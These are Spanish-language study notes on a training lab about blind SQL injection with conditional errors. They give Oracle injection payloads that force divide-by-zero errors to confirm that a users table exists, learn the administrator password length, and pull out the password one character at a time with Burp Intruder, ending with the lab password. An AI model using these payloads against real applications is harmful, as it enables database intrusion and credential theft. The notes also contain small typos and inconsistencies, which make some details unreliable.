# 12 Lab: Blind SQL injection with conditional errors

```jsx
';
''; //Verificamos que reacciona solo con un ' (error de sintaxis)
/// EXISTE TABLA USERS Y fila administrator
'||(SELECT '' FROM dual)||'
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
// De esta manera forzaremos un error con una query real
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

/// Obtener longitud de la clave, obtenemos que tiene 20 caracteres
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
/// Obtener CADA CARACTER
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
// Probamos con Intruder
'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§A§' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
son 20 caracteres, estos pueden ser minuscular y caracteres alfanumericos

administrator
zc83du733ks81egn2kii
```

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled.png)

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%201.png)

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%202.png)

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%203.png)

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%204.png)

Esto demuestra que puede desencadenar un error condicionalmente a la veracidad de una condición específica. La declaración CASE prueba una condición y la evalúa como una expresión si la condición es verdadera y otra expresión si la condición es falsa. La primera expresión contiene una división por cero, lo que provoca un error. En este caso, las dos cargas útiles prueban las condiciones 1=1 y 1=2, y se recibe un error cuando la condición es verdadera.

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%205.png)

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%206.png)

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%207.png)

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%208.png)

Recordemos que nos mostrará el error de Internal Server Error, solo cuando haya un error en la query.

Por eso usaremos un condicional anidado :

```jsx
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
// Query
SELECT 
    CASE 
        WHEN (1=1) THEN TO_CHAR(1/0) 
        ELSE '' 
    END 
FROM users WHERE username='administrator';
```

WHEN (1=1) THEN TO_CHAR(1/0)  <Es un error, puesto que 1/0 será un error en SQL>

POR ESO MOSTRARÁ EN MENSAJE DE ERROR, SI EXISTE LA OTRA CONDICIONAL: ***FROM users WHERE username='administrator'***

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%209.png)

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%2010.png)

```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

SELECT 
	CASE 
		WHEN LENGTH(password)>1 THEN to_char(1/0) 
		ELSE '' 
	END 
FROM users WHERE username='administrator'

SELECT 
	CASE 
		WHEN <CONDICIÓN A CONSULTAR> THEN <ARTIFICIO QUE SIEMPRE DARA ERROR> 
		ELSE '' 
	END 
FROM users WHERE username='administrator'

SI LA CONDICIÓN A CONSULTAR, CUMPLE, ENTONCES NOS BOTARÁ UN ERROR, PUESTO QUE ES UNA CONSULTA A CIEGAS
```

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%2011.png)

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%2012.png)

SUBSTR(password,1,1)='a’

```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

SELECT 
	CASE 
		WHEN WHEN SUBSTR(password,$1$,1)='$a$' THEN to_char(1/0) 
		ELSE '' 
	END 
FROM users WHERE username='administrator'

```

![Untitled](12%20Lab%20Blind%20SQL%20injection%20with%20conditional%20errors%2012cfab5460ec801ab084d177f08b5476/Untitled%2013.png)

zc83du733ks813egn2kii

fgdfgdfgd